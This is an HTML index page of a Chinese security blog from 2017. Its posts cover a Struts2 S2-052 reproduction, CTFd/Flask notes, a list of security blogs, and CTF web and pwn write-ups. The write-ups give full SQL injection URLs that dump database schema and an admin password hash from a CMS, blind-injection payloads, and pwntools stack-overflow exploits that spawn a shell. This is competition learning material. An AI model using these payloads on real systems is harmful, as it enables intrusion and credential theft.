+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>发送恶意XML数据，反弹shell：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/struts2%20S2-052%20%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/s2_052_poc.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/09/07/struts2-S2-052-复现及分析/" data-id="cjbc9l1gw000aukvkmtok4osh" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CTFd-Flask-使用flask-migrate迁移数据库" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/16/CTFd-Flask-使用flask-migrate迁移数据库/" class="article-date">
+  <time datetime="2017-07-15T19:55:09.000Z" itemprop="datePublished">2017-07-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/16/CTFd-Flask-使用flask-migrate迁移数据库/">CTFd--Flask--使用flask-migrate迁移数据库</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在开发过程中，数据库的模型有时候要更改，此时要修改 models.py，并执行一次新数据库迁移。<br>manage.py:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask_sqlalchemy import SQLAlchemy</span><br><span class="line">from flask_script import Manager</span><br><span class="line">from flask_migrate import Migrate, MigrateCommand</span><br><span class="line">from CTFd import create_app</span><br><span class="line"></span><br><span class="line">app = create_app()</span><br><span class="line"></span><br><span class="line">manager = Manager(app)</span><br><span class="line">manager.add_command(&apos;db&apos;, MigrateCommand)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure>
+<p>修改CTFd/models.py文件后，执行python manage.py db migrate -m “the filename you want to use”  ，会在CTFd/migrations/versions文件夹中创建一个新的py文件，检查里面的数据库操作，执行python manage.py db upgrade 会更新数据库。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/07/16/CTFd-Flask-使用flask-migrate迁移数据库/" data-id="cjbc9l1gg0003ukvkcd4atvj8" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CTFd-发邮件的坑" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/16/CTFd-发邮件的坑/" class="article-date">
+  <time datetime="2017-07-15T19:48:26.000Z" itemprop="datePublished">2017-07-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/16/CTFd-发邮件的坑/">CTFd--发邮件的坑</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CTFd/utils.py中，smtp邮件服务器鉴权的函数为：</p>
+<pre><code>def get_smtp(host, port, username=None, password=None, TLS=None, SSL=None):
+smtp = smtplib.SMTP(host, port)
+smtp.ehlo()
+if TLS:
+    smtp.starttls()
+    smtp.ehlo()
+smtp.login(username, password)
+return smtp
+</code></pre><p>使用了smtplib.SMTP类，但是如果邮件服务器使用了SSL，则需要使用smtplib.SMTP_SSL类：</p>
+<pre><code>def get_smtp(host, port, username=None, password=None, TLS=None, SSL=None):
+if SSL:
+    smtp = smtplib.SMTP_SSL(host, port)
+    smtp.ehlo()
+elif TLS:
+    smtp = smtplib.SMTP(host, port)
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.ehlo()
+smtp.login(username, password)
+return smtp
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/07/16/CTFd-发邮件的坑/" data-id="cjbc9l1gk0004ukvk0j4dw9zs" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-第十届全国大学生信息安全竞赛-部分web-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/12/第十届全国大学生信息安全竞赛-部分web-writeup/" class="article-date">
+  <time datetime="2017-07-12T11:23:16.000Z" itemprop="datePublished">2017-07-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/12/第十届全国大学生信息安全竞赛-部分web-writeup/">第十届全国大学生信息安全竞赛 部分web-writeup</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>上周末打了第十届全国大学生信息安全竞赛，题目是不错的，但是这个比赛某些方面十分的神奇，呵呵~<br>这边记录一下自己做出来的两道web题（太菜了）<br>ven师傅的wp:<a href="http://www.venenof.com/index.php/archives/386/" target="_blank" rel="noopener">http://www.venenof.com/index.php/archives/386/</a><br>土师傅的wp:<a href="http://lorexxar.cn/2017/07/11/guosai2017/" target="_blank" rel="noopener">http://lorexxar.cn/2017/07/11/guosai2017/</a><br>柠檬师傅的wp:<a href="http://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html</a></p>
+<h2 id="php-exercise"><a href="#php-exercise" class="headerlink" title="php exercise"></a>php exercise</h2><p>php代码执行<br>我的方法：print_r(scandir(‘./‘))列文件，file_put_contents(“121.php”,”&lt;?php include ‘flag.php’; echo $flag;?&gt;”)，用bp的intruder维持121.php的文件内容（智商太低）<br>其他方法：print_r(glob(‘./f*’))列文件，show_source读文件内容</p>
+<h2 id="wanna-to-see-your-hat"><a href="#wanna-to-see-your-hat" class="headerlink" title="wanna to see your hat?"></a>wanna to see your hat?</h2><p>抓包可以看到<code>select count(*) from t_info where username = &#39;aaa&#39; or nickname = &#39;aaa&#39;</code><br>发现.svn泄漏<br>审计一波，关键点在：</p>
+<pre><code>if(isset($_SESSION[&apos;hat&apos;])){
+if($_SESSION[&apos;hat&apos;]==&apos;green&apos;){
+output(&quot;&lt;img src=&apos;green-hat-1.jpg&apos;&gt;&quot;,10);
+}else{
+output(&quot;&lt;img src=&apos;black-fedora.jpg&apos;&gt;&quot;,1);
+echo $flag;
+}
+</code></pre><p>在login.php中设置session：</p>
+<pre><code>if (isset($_POST[&quot;name&quot;])){
+</code></pre><p>  $name = str_replace(“‘“, “”, trim(waf($_POST[“name”])));<br>  if (strlen($name) &gt; 11){<br>    echo(“&lt;script&gt;alert(‘name too long’)&lt;/script&gt;”);<br>  }else{<br>    $sql = “select count(*) from t_info where username = ‘$name’ or nickname = ‘$name’”;<br>    echo $sql;<br>    $result = mysql_query($sql);<br>    $row = mysql_fetch_array($result);<br>    if ($row[0]){<br>      $_SESSION[‘hat’] = ‘black’;<br>      echo ‘good job’;<br>    }else{<br>    $_SESSION[‘hat’] = ‘green’;<br>    }<br>    header(“Location: index.php”);<br>  }</p>
+<p>}</p>
+<p>其中有这么一句话：<code>$name = str_replace(&quot;&#39;&quot;, &quot;&quot;, trim(waf($_POST[&quot;name&quot;])));</code><br>意味着addslashes转义后的单引号会被吃掉，可以利用这个将sql语句中原本的单引号吃掉<br>payload：<code>select count(*) from t_info where username = &#39;or(1=1)#\&#39; or nickname = &#39;or(1=1)#\&#39;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/07/12/第十届全国大学生信息安全竞赛-部分web-writeup/" data-id="cjbc9l1h3000fukvkvpnukdnt" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-收集一下各位师傅的个人博客和各种安全博客（个人备忘）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/06/14/收集一下各位师傅的个人博客和各种安全博客（个人备忘）/" class="article-date">
+  <time datetime="2017-06-14T13:20:14.000Z" itemprop="datePublished">2017-06-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/06/14/收集一下各位师傅的个人博客和各种安全博客（个人备忘）/">收集一下各位师傅的个人博客和各种安全博客（个人备忘）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="个人"><a href="#个人" class="headerlink" title="个人"></a>个人</h3><p>余弦 <a href="http://evilcos.me/" target="_blank" rel="noopener">http://evilcos.me/</a><br>独自等待 <a href="https://www.waitalone.cn/" target="_blank" rel="noopener">https://www.waitalone.cn/</a><br>phithon <a href="https://www.leavesongs.com" target="_blank" rel="noopener">https://www.leavesongs.com</a><br>Sec-News <a href="http://wiki.ioin.in/" target="_blank" rel="noopener">http://wiki.ioin.in/</a><br>冷夜 <a href="http://le4f.net/" target="_blank" rel="noopener">http://le4f.net/</a><br>bigtang <a href="http://bigtang.org/" target="_blank" rel="noopener">http://bigtang.org/</a><br>md5_salt <a href="http://5alt.me/" target="_blank" rel="noopener">http://5alt.me/</a><br>Flanker <a href="https://blog.flanker017.me/" target="_blank" rel="noopener">https://blog.flanker017.me/</a><br>quininer<a href="https://quininer.github.io/" target="_blank" rel="noopener">https://quininer.github.io/</a><br>Mathias <a href="http://www.math1as.com/" target="_blank" rel="noopener">http://www.math1as.com/</a><br>wilson <a href="http://blog.wils0n.cn/" target="_blank" rel="noopener">http://blog.wils0n.cn/</a><br>Silver <a href="https://blog.iret.xyz/" target="_blank" rel="noopener">https://blog.iret.xyz/</a><br>Virink <a href="https://www.virzz.com/" target="_blank" rel="noopener">https://www.virzz.com/</a><br>Ricky <a href="https://rickyhao.com/" target="_blank" rel="noopener">https://rickyhao.com/</a><br>几何 <a href="http://blog.7ell.me/" target="_blank" rel="noopener">http://blog.7ell.me/</a><br>王松_striker <a href="http://www.hackersb.cn/" target="_blank" rel="noopener">http://www.hackersb.cn/</a><br>AppLeU0 <a href="http://appleu0.sinaapp.com/" target="_blank" rel="noopener">http://appleu0.sinaapp.com/</a><br>0h1in9e <a href="https://www.ohlinge.cn/" target="_blank" rel="noopener">https://www.ohlinge.cn/</a><br>Tr3jer_CongRong <a href="http://www.thinkings.org/" target="_blank" rel="noopener">http://www.thinkings.org/</a><br>Nearg1e <a href="http://blog.neargle.com/" target="_blank" rel="noopener">http://blog.neargle.com/</a><br>Veneno <a href="http://www.venenof.com/" target="_blank" rel="noopener">http://www.venenof.com/</a><br>virusdefender <a href="https://virusdefender.net/" target="_blank" rel="noopener">https://virusdefender.net/</a><br>火日攻天 <a href="http://www.firesun.me/" target="_blank" rel="noopener">http://www.firesun.me/</a><br>Melody <a href="http://www.melodia.pw/" target="_blank" rel="noopener">http://www.melodia.pw/</a><br>乐清小俊杰 <a href="http://www.yqxiaojunjie.com/" target="_blank" rel="noopener">http://www.yqxiaojunjie.com/</a><br>猫哥 <a href="http://blog.cal1.cn" target="_blank" rel="noopener">http://blog.cal1.cn</a><br>albertchang <a href="http://blog.albertchang.cn" target="_blank" rel="noopener">http://blog.albertchang.cn</a><br>画船 <a href="https://blog.nuptzj.cn/" target="_blank" rel="noopener">https://blog.nuptzj.cn/</a><br>bendawang<a href="http://bendawang.site/" target="_blank" rel="noopener">http://bendawang.site/</a><br>LoRexxar <a href="http://lorexxar.cn/" target="_blank" rel="noopener">http://lorexxar.cn/</a><br>Aklis <a href="http://aklis.info/" target="_blank" rel="noopener">http://aklis.info/</a><br>RicterZ <a href="https://ricterz.me/" target="_blank" rel="noopener">https://ricterz.me/</a><br>muhe <a href="http://o0xmuhe.me/" target="_blank" rel="noopener">http://o0xmuhe.me/</a><br>lemon <a href="http://www.cnblogs.com/iamstudy/" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/</a><br>Cheery <a href="http://www.cheery.win" target="_blank" rel="noopener">http://www.cheery.win</a><br>Hcamael <a href="http://0x48.pw/" target="_blank" rel="noopener">http://0x48.pw/</a><br>精灵 <a href="https://www.hackfun.org/" target="_blank" rel="noopener">https://www.hackfun.org/</a><br>redrain <a href="http://hackdog.me/" target="_blank" rel="noopener">http://hackdog.me/</a><br>凤凰 <a href="https://blog.phoenixlzx.com/" target="_blank" rel="noopener">https://blog.phoenixlzx.com/</a><br>Jason <a href="https://www.deamwork.com/" target="_blank" rel="noopener">https://www.deamwork.com/</a><br>lightless <a href="https://lightless.me/" target="_blank" rel="noopener">https://lightless.me/</a><br>zh_explorer <a href="http://libc.pw/" target="_blank" rel="noopener">http://libc.pw/</a><br>陌小生 <a href="http://www.xmsec.cc/" target="_blank" rel="noopener">http://www.xmsec.cc/</a><br>JoyChou <a href="http://joychou.org" target="_blank" rel="noopener">http://joychou.org</a><br>angelwhu <a href="http://www.angelwhu.com/blog/" target="_blank" rel="noopener">http://www.angelwhu.com/blog/</a><br>泉哥 <a href="http://riusksk.me/" target="_blank" rel="noopener">http://riusksk.me/</a><br>安全小飞侠 <a href="http://avfisher.win" target="_blank" rel="noopener">http://avfisher.win</a><br>李劼杰 <a href="http://www.lijiejie.com/" target="_blank" rel="noopener">http://www.lijiejie.com/</a><br>无所不能的魂大人 <a href="http://woldy.net/" target="_blank" rel="noopener">http://woldy.net/</a><br>江sir <a href="http://www.blogsir.com.cn/" target="_blank" rel="noopener">http://www.blogsir.com.cn/</a><br>swing <a href="http://bestwing.me/" target="_blank" rel="noopener">http://bestwing.me/</a><br>Jarvis <a href="https://www.jarviswang.me/" target="_blank" rel="noopener">https://www.jarviswang.me/</a><br>Orange <a href="http://blog.orange.tw/" target="_blank" rel="noopener">http://blog.orange.tw/</a><br>Cizel <a href="http://www.cizel.cn/" target="_blank" rel="noopener">http://www.cizel.cn/</a><br>Atum <a href="http://gcli.cn/" target="_blank" rel="noopener">http://gcli.cn/</a><br>0xJDchen <a href="http://www.cnblogs.com/0xJDchen/" target="_blank" rel="noopener">http://www.cnblogs.com/0xJDchen/</a><br>tennc <a href="https://tennc.github.io/" target="_blank" rel="noopener">https://tennc.github.io/</a><br>Rocky <a href="http://rockyrays.me/" target="_blank" rel="noopener">http://rockyrays.me/</a><br>Anciety <a href="http://anciety.cn" target="_blank" rel="noopener">http://anciety.cn</a><br>Tomato <a href="https://bl4ck.in/" target="_blank" rel="noopener">https://bl4ck.in/</a><br>Tomyxy <a href="http://www.tomyxy.com" target="_blank" rel="noopener">http://www.tomyxy.com</a><br>BrieflyX <a href="http://brieflyx.me/" target="_blank" rel="noopener">http://brieflyx.me/</a><br>RootKiter <a href="http://rootkiter.com" target="_blank" rel="noopener">http://rootkiter.com</a><br>berTrAM <a href="http://www.bertramc.cn" target="_blank" rel="noopener">http://www.bertramc.cn</a><br>WinterSun <a href="https://winter3un.github.io/" target="_blank" rel="noopener">https://winter3un.github.io/</a><br>EvilChurch <a href="https://evilchurch.cc/" target="_blank" rel="noopener">https://evilchurch.cc/</a><br>小西 <a href="http://momomoxiaoxi.com/" target="_blank" rel="noopener">http://momomoxiaoxi.com/</a><br>该隐 <a href="http://ecma.io/" target="_blank" rel="noopener">http://ecma.io/</a><br>Seay <a href="http://www.cnseay.com/" target="_blank" rel="noopener">http://www.cnseay.com/</a><br>廖新喜 <a href="http://xxlegend.com/" target="_blank" rel="noopener">http://xxlegend.com/</a><br>雨了个雨 <a href="http://www.yulegeyu.com/" target="_blank" rel="noopener">http://www.yulegeyu.com/</a><br>Ox9A82 <a href="http://www.cnblogs.com/Ox9A82/" target="_blank" rel="noopener">http://www.cnblogs.com/Ox9A82/</a><br>k0shl <a href="http://whereisk0shl.top/" target="_blank" rel="noopener">http://whereisk0shl.top/</a><br>fate0 <a href="http://blog.fatezero.org" target="_blank" rel="noopener">http://blog.fatezero.org</a><br>luan <a href="http://lu4n.com/" target="_blank" rel="noopener">http://lu4n.com/</a><br>聂心明 <a href="http://blog.csdn.net/niexinming" target="_blank" rel="noopener">http://blog.csdn.net/niexinming</a><br>Firmy <a href="https://firmianay.github.io/" target="_blank" rel="noopener">https://firmianay.github.io/</a><br>sploitfun <a href="https://sploitfun.wordpress.com/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/</a><br>他是鹿 <a href="http://blog.th3s3v3n.xyz" target="_blank" rel="noopener">http://blog.th3s3v3n.xyz</a><br>虫虫之家 <a href="http://ijz.me" target="_blank" rel="noopener">http://ijz.me</a><br>evi1m0 <a href="http://rm-rf.gg/" target="_blank" rel="noopener">http://rm-rf.gg/</a><br>WeaponX <a href="http://weaponx.site" target="_blank" rel="noopener">http://weaponx.site</a><br>ADog’s Blog-信息安全博客 <a href="http://foreversong.cn/" target="_blank" rel="noopener">http://foreversong.cn/</a><br>麦香师傅 <a href="http://mxny.org/" target="_blank" rel="noopener">http://mxny.org/</a></p>
+<h3 id="组织"><a href="#组织" class="headerlink" title="组织"></a>组织</h3><p>邪恶十六进制 <a href="http://www.evil0x.com/" target="_blank" rel="noopener">http://www.evil0x.com/</a><br>三叶草安全小组 <a href="http://blog.sycsec.com/" target="_blank" rel="noopener">http://blog.sycsec.com/</a><br>破晓团队 <a href="http://www.secbug.org" target="_blank" rel="noopener">http://www.secbug.org</a><br>西电信息安全协会 <a href="https://www.xdsec.club/" target="_blank" rel="noopener">https://www.xdsec.club/</a><br>L-Team <a href="http://l-team.org/" target="_blank" rel="noopener">http://l-team.org/</a><br>绿盟科技博客 <a href="http://blog.nsfocus.net/" target="_blank" rel="noopener">http://blog.nsfocus.net/</a><br>蓝莲花 <a href="http://www.blue-lotus.net/" target="_blank" rel="noopener">http://www.blue-lotus.net/</a><br>0ops <a href="http://www.0ops.net/" target="_blank" rel="noopener">http://www.0ops.net/</a><br>Dragon Sector <a href="http://blog.dragonsector.pl/" target="_blank" rel="noopener">http://blog.dragonsector.pl/</a><br>PPP <a href="http://pwning.net/" target="_blank" rel="noopener">http://pwning.net/</a><br>长亭科技 <a href="https://blog.chaitin.cn/" target="_blank" rel="noopener">https://blog.chaitin.cn/</a><br>腾讯科恩实验室 <a href="http://keenlab.tencent.com/zh/index.html" target="_blank" rel="noopener">http://keenlab.tencent.com/zh/index.html</a><br>腾讯玄武实验室 <a href="http://xlab.tencent.com/cn/" target="_blank" rel="noopener">http://xlab.tencent.com/cn/</a><br>Project Zero <a href="https://googleprojectzero.blogspot.hk/" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/</a><br>杭电信安协会 <a href="http://hduisa.org/" target="_blank" rel="noopener">http://hduisa.org/</a><br>kap0k <a href="http://www.kap0k.com/" target="_blank" rel="noopener">http://www.kap0k.com/</a><br>胖哈勃博客 <a href="https://blog.pwnhub.cn/" target="_blank" rel="noopener">https://blog.pwnhub.cn/</a><br>seebug <a href="http://paper.seebug.org/" target="_blank" rel="noopener">http://paper.seebug.org/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/06/14/收集一下各位师傅的个人博客和各种安全博客（个人备忘）/" data-id="cjbc9l1h0000dukvk9m3ax81l" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/瞎写/">瞎写</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-红帽杯线下赛总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/05/25/红帽杯线下赛总结/" class="article-date">
+  <time datetime="2017-05-24T16:25:20.000Z" itemprop="datePublished">2017-05-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/25/红帽杯线下赛总结/">红帽杯线下赛总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>先占坑。。。等团队总结完了再来</p>
+<p>这次线下各种手忙脚乱。。。</p>
+<p>不过个人觉得最大的失误就是D了西电大佬的服务器，导致之后西电大佬一直追着我们打。。大佬我错了。。。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/05/25/红帽杯线下赛总结/" data-id="cjbc9l1hc000jukvkbaf146vx" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-红帽杯2017-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/05/25/红帽杯2017-writeup/" class="article-date">
+  <time datetime="2017-05-24T16:11:58.000Z" itemprop="datePublished">2017-05-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/25/红帽杯2017-writeup/">红帽杯2017 writeup</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="brain-Y"><a href="#brain-Y" class="headerlink" title="brain(Y)"></a>brain(Y)</h2><p>brainfuck</p>
+<h2 id="刮刮乐"><a href="#刮刮乐" class="headerlink" title="刮刮乐"></a>刮刮乐</h2><p>.git泄漏<br>106.75.67.7:3080/.git/</p>
+<h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><p>提示是后台密码2017年某一天。。。直接20170505进去了。。。尴尬</p>
+<h2 id="PHPMyWIND"><a href="#PHPMyWIND" class="headerlink" title="PHPMyWIND"></a>PHPMyWIND</h2><p>通过一篇文章<a href="http://0day5.com/archives/1146/知道这个cms存在sql注入" target="_blank" rel="noopener">http://0day5.com/archives/1146/知道这个cms存在sql注入</a><br>查数据库名：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,SCHEMA_NAME,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.SCHEMATA  limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>查表名：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,TABLE_NAME,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.TABLES where TABLE_SCHEMA=0x7068706d7977696e645f6462 limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>查列名：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,COLUMN_NAME,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.COLUMNS where TABLE_NAME=0x706d775f61646d696e limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>查admin的帐号密码的hash：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from pmw_admin  limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>登录后台在在模版文件那里可以看到flag文件</p>
+<h2 id="thinkseeker"><a href="#thinkseeker" class="headerlink" title="thinkseeker"></a>thinkseeker</h2><p><a href="http://106.75.117.4:3083/index.php~" target="_blank" rel="noopener">http://106.75.117.4:3083/index.php~</a> ，存在备份文件源码泄露：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+$token=&quot;e00cf25ad42683b3df678c61f42c6bda&quot;;
+
+foreach($_GET as $key=&gt;$value){ 
+    if (is_array($value)){
+        die(&quot;Bad input!&quot;);
+    }
+    $p=&quot;and|union|where|join|sleep|benchmark|if|sleep|benchmark|,| |\&apos;|\&quot;&quot;;
+    if(preg_match(&quot;/&quot;.$p.&quot;/is&quot;,$value)==1){
+        die(&quot;inj code!&quot;);
+    }
+}
+
+parse_str($_SERVER[&apos;QUERY_STRING&apos;]);
+
+if($token==md5(&quot;admin&quot;)){
+    $link=@mysql_connect(&quot;XXXX&quot;,&quot;XXXX&quot;,&quot;XXXX&quot;);
+    mysql_select_db(&quot;XXXX&quot;,$link);
+    $sql=&quot;select * from user where userid = &quot;.$userid;
+    $query = mysql_query($sql);
+    if (mysql_num_rows($query) == 1) { 
+        $arr = mysql_fetch_array($query);
+        if($arr[&apos;password&apos;] == $password) {
+            $sql=&quot;select * from info where infoid=&quot;.$infoid;
+            $result=mysql_query($sql);
+            $arr = mysql_fetch_array($result);
+            if(empty($arr[&apos;content&apos;])){
+                echo &quot;error sql!&quot;;
+            }else{
+                echo $arr[&apos;content&apos;];
+            }
+        }else{
+            echo &quot;error password!&quot;;
+        }
+    }else{
+        echo &quot;error userid!&quot;;
+    }
+    mysql_close($link);
+}else{
+    echo &quot;Bad token!&quot;;
+}
+?&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;web-test&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;
+            User ID:&lt;input type=&quot;text&quot; name=&quot;userid&quot; length=&quot;50&quot; /&gt;&lt;br&gt;
+            Password:&lt;input type=&quot;password&quot; name=&quot;password&quot; length=&quot;50&quot; /&gt;&lt;br&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>可以看到需要确定的几个参数为token、password、userid、infoid<br>token值为：<br>md5(“admin”)== 21232f297a57a5a743894a0e4a801fc3<br>尝试userid=1，发现正确<br>构造payload查password：</p>
+<pre><code>http://106.75.117.4:3083/?userid=1%%26%%26ascii(mid(password/**/from/**/%s/**/for/**/1))=%s&amp;password=1&amp;token=21232f297a57a5a743894a0e4a801fc3&amp;infoid=
+</code></pre><p>盲注脚本跑一发<br>猜测infoid为1，正确<br>构造payload查flag：</p>
+<pre><code>http://106.75.117.4:3083/?userid=1%%26%%26ascii(mid((select/**/flag/**/from/**/flag)/**/from/**/%s/**/for/**/1))=%s&amp;password=219d03ad2d752ad2806ea1de18613158&amp;token=21232f297a57a5a743894a0e4a801fc3&amp;infoid=1
+</code></pre><p>盲注脚本跑一发</p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>简单的栈溢出，构造一个ROP即可<br>exp</p>
+<pre><code>from pwn import *
+e=ELF(&apos;./pwn1_c1d0173e20a08feff046c8433f53fd37&apos;)
+p=remote(&apos;106.75.93.221&apos;,10000)
+sys_addr=p32(e.symbols[&apos;system&apos;])
+ret_addr=&apos;\x12\x12\x12\x12&apos;
+payload=&apos;A&apos;*52+sys_addr+ret_addr+p32(e.search(&apos;sh&apos;).next())
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>也是简单的栈溢出（只会做栈溢出。。【捂脸】）<br>但是开了cananry<br>但显然flag已经被读入了内存。当_stack_check_fail时，会打印出当前程序的名称，只需要用flag地址覆盖argv[0]的地址即可。<br>exp</p>
+<pre><code>from pwn import *
+e=ELF(&apos;./pwnsss_d1b5b1011fc0ef9b3de9cb0ad261295a&apos;)
+p=remote(&apos;106.75.93.221&apos;,10003)
+payload=&apos;A&apos;*292+p32(0x804a080)
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/05/25/红帽杯2017-writeup/" data-id="cjbc9l1h8000hukvk1frzwc5t" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
